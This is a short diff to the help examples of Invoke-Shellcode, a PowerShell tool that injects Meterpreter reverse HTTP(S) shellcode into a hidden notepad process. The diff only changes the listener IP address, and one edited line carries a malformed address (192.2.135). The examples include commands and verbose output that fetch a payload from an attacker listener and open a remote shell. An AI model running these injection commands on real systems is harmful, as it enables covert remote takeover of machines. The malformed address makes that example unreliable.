@@ -79,9 +79,9 @@ Inject shellcode into the running instance of PowerShell.
 
 C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
 C:\PS> $Proc = Get-Process notepad
-C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbose
+C:\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.2.135 -Lport 443 -Verbose
 
-VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
+VERBOSE: Requesting meterpreter payload from https://192.168.2.135:443/INITM
 VERBOSE: Injecting shellcode into PID: 4004
 VERBOSE: Injecting into a Wow64 process.
 VERBOSE: Using 32-bit shellcode.
@@ -99,12 +99,12 @@ Payload options (windows/meterpreter/reverse_https):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
-LHOST     192.168.30.129   yes       The local listener hostname
+LHOST     192.168.2.135   yes       The local listener hostname
 LPORT     443              yes       The local listener port
 
 .EXAMPLE
 
-C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 80
+C:\PS> Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.2.135 -Lport 80
 
 Description
 -----------
@@ -115,7 +115,7 @@ Payload options (windows/meterpreter/reverse_http):
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
 EXITFUNC  thread           yes       Exit technique: seh, thread, process, none
-LHOST     192.168.30.129   yes       The local listener hostname
+LHOST     192.168.2.135   yes       The local listener hostname
 LPORT     80               yes       The local listener port
 
 .EXAMPLE
